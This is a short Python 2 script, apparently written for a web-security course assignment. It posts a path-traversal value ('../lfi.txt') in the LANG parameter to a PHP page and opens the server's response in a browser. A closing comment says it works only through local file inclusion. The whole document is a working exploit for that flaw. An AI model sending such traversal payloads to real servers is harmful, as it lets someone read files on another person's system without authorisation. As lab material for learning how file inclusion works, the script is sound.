import urllib, urllib2, cookielib, webbrowser, os

url = "http://www.wsb.com/Assignment2/case25.php"
values = dict(LANG="../lfi.txt")
data = urllib.urlencode(values)
req = urllib2.Request(url, data)
rsp = urllib2.urlopen(req)
content = rsp.read()
tmp_file = "/tmp/tmp.html"
fp = open(tmp_file, "w")
fp.write(content)
fp.close()
webbrowser.open("file://" + os.path.realpath(tmp_file))

# ONLY WORKS WITH LOCAL FILE INCLUSION